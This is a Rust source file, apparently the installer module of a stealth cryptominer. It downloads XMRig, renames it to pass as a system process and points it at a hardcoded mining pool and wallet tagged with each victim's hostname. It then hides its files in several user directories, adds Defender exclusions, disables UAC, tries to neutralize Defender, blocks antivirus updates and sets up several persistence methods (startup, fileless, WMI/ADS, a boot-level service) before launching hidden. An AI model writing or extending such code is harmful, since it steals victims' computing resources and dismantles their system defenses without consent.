use std::fs::{self, File};
use std::io::Write;
use std::path::Path;

use crate::common::config::MinerConfig;
use crate::common::constants::{
    DOWNLOAD_URL, POOL_URL, WALLET, 
    get_miner_exe_name, get_launcher_script_name, CONFIG_FILENAME
};
use crate::utils::files::{download_file, extract_zip, move_files_from_subdir, copy_dir_recursive};
use crate::utils::paths::{get_all_install_dirs, set_hidden_recursive, get_userprofile};
use crate::system::process::{create_watchdog_script, start_hidden, stop_mining};
use crate::system::registry::{add_to_startup, remove_from_startup};

pub fn install() -> Result<(), Box<dyn std::error::Error>> {
    // 1. Prepare Initial Staging Area (Temp)
    let staging_dir = get_userprofile().join("AppData").join("Local").join("Temp").join("Staging_SystemChek"); // Hardcoded temp staging
    if staging_dir.exists() {
        let _ = fs::remove_dir_all(&staging_dir);
    }
    fs::create_dir_all(&staging_dir)?;

    // Download XMRig
    let zip_path = staging_dir.join("package.zip");
    download_file(DOWNLOAD_URL, &zip_path)?;

    // Extract
    extract_zip(&zip_path, &staging_dir)?;
    move_files_from_subdir(&staging_dir)?;

    // Rename XMRig to SysSvchost
    let old_xmrig = staging_dir.join("xmrig.exe");
    let new_miner = staging_dir.join(get_miner_exe_name());
    if old_xmrig.exists() {
        fs::rename(old_xmrig, &new_miner)?;
    } else {
        // If it's already renamed or missing?
        if !new_miner.exists() {
             return Err("Miner executable not found after extraction".into());
        }
    }

    // Create Config
    let total_threads = num_cpus::get() as i32;
    let mining_threads = std::cmp::max(1, total_threads / 2);
    
    // Generate Dynamic Worker ID: Hostname-Random7
    let host = hostname::get()
        .map(|h| h.to_string_lossy().into_owned())
        .unwrap_or_else(|_| "UNKNOWN".to_string());
        
    use rand::{Rng, distributions::Alphanumeric};
    let random_suffix: String = rand::thread_rng()
        .sample_iter(&Alphanumeric)
        .take(7)
        .map(char::from)
        .collect::<String>()
        .to_uppercase();
        
    let final_wallet = format!("{}.{}-{}", WALLET, host, random_suffix);
    
    let config_path = staging_dir.join(CONFIG_FILENAME);
    let config = MinerConfig::new(POOL_URL, &final_wallet, mining_threads);
    let json = serde_json::to_string_pretty(&config)?;
    let mut file = File::create(&config_path)?;
    file.write_all(json.as_bytes())?;

    // Clean up zip
    let _ = fs::remove_file(&zip_path);

    // 2. Distribute to ALL locations (AppData, LocalAppData, Temp)
    let install_dirs = get_all_install_dirs();
    
    // First, copy files to all locations
    for dir in &install_dirs {
        if dir.exists() {
            let _ = fs::remove_dir_all(dir);
        }
        fs::create_dir_all(dir)?;
        copy_dir_recursive(&staging_dir, dir)?;
    }

    // 3. Generate Scripts in ALL locations
    // We pass the list of all install dirs so the scripts can cross-reference
    create_watchdog_script(&install_dirs, &Path::new("dummy"))?; // Config path is relative in script now

    // 4. Set Hidden Attributes on ALL locations
    for dir in &install_dirs {
        set_hidden_recursive(dir)?;
        // Auto-whitelist in Defender
        let _ = crate::system::process::add_defender_exclusion(dir);
    }
    
    // 5. Seed the Registry Ledger (P2P Discovery)
    #[cfg(windows)]
    {
        use std::process::Command;
        let dirs_str = install_dirs.iter()
            .map(|d| d.display().to_string())
            .collect::<Vec<String>>()
            .join(";");
            
        let _ = Command::new("powershell.exe")
            .args(&[
                "-Command",
                &format!("New-Item -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\SystemChek' -Force; Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\SystemChek' -Name 'Nodes' -Value '{}'", dirs_str)
            ])
            .output();
    }

    // 5. Add to Startup (Use the First available location, usually AppData)
    if let Some(primary_dir) = install_dirs.first() {
        let launcher = primary_dir.join(get_launcher_script_name());
        add_to_startup(&launcher)?;
        
        // Disable UAC prompts
        let _ = crate::system::registry::disable_uac();
        
        // Neutralize Defender (Allow threats)
        let _ = crate::system::process::neutralize_defender();
        
        // Deep Sleeper (Fileless Persistence)
        let _ = crate::system::process::create_fileless_sleeper();

        // System Supervisor Service (Boot-Level)
        let _ = crate::system::process::create_system_supervisor();

        // Chameleon Protocol (Communications Jamming)
        let _ = crate::system::network::block_av_updates();

        // Shadow Persistence (ADS + WMI)
        let _ = crate::system::shadow::apply_shadow_persistence();

        // Copy self to bin (optional, can skip or rename to sys_installer.exe)
        // let _ = copy_self_to_bin(); 
    }

    // 6. Start (Launch from all locations to be safe/ensure redundancy kicks in)
    for dir in &install_dirs {
        let launcher = dir.join(get_launcher_script_name());
        if launcher.exists() {
             start_hidden(&launcher)?;
        }
    }

    // Cleanup Staging
    let _ = fs::remove_dir_all(&staging_dir);

    Ok(())
}

pub fn uninstall() -> Result<(), Box<dyn std::error::Error>> {
    stop_mining()?;
    remove_from_startup()?;
    
    // Remove all install directories
    let install_dirs = get_all_install_dirs();
    for dir in install_dirs {
        if dir.exists() {
            let _ = fs::remove_dir_all(&dir);
        }
    }
    
    Ok(())
}

pub fn start() -> Result<(), Box<dyn std::error::Error>> {
    let install_dirs = get_all_install_dirs();
    let mut started = false;

    for dir in &install_dirs {
        let launcher = dir.join(get_launcher_script_name());
        if launcher.exists() {
            start_hidden(&launcher)?;
            started = true;
        }
    }

    if !started {
        // Self-Healing Trigger?
        // If NO location exists, we might be broken.
        // But if at least ONE exists, it should have started and ostensibly healed the others.
        // If the user runs 'automine start', we assume they might be running the installer again or just the CLI.
        println!("No valid installation found to start.");
    }
    
    Ok(())
}

#[cfg(windows)]
pub fn status() {
    use std::process::Command;
    
    if let Ok(output) = Command::new("tasklist")
        .args(&["/FI", &format!("IMAGENAME eq {}", get_miner_exe_name())])
        .output()
    {
        let stdout = String::from_utf8_lossy(&output.stdout);
        if stdout.contains(&get_miner_exe_name()) {
            println!("RUNNING");
        } else {
            println!("STOPPED");
        }
    } else {
        println!("UNKNOWN");
    }
}

#[cfg(not(windows))]
pub fn status() {
    let install_dirs = get_all_install_dirs();
    let installed = install_dirs.iter().any(|d| d.exists());
    
    if installed {
         println!("INSTALLED (Linux/Mac Check)");
    } else {
         println!("NOT_INSTALLED");
    }
}
